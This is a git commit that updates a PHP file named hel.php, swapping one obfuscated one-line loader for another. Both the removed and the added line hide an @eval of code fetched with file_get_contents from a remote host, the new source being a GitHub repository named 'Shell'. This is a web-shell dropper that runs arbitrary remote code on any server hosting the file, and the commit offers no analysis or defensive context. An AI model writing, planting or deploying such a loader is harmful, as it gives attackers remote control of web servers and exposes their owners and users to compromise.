0a7a8e106022b119588f1777aa790b24813609b0
dhiff <74091721+ardifx01@users.noreply.github.com>
2025-11-04 14:23:40 +0700

    Update hel.php

--- hel.php
+++ hel.php
@@ -1,1 +1,2 @@
-<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://file.0x1999.tech/al.txt"));/**/?>
+<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/ardifx01/Shell/main/al.php"));/**/?>
+
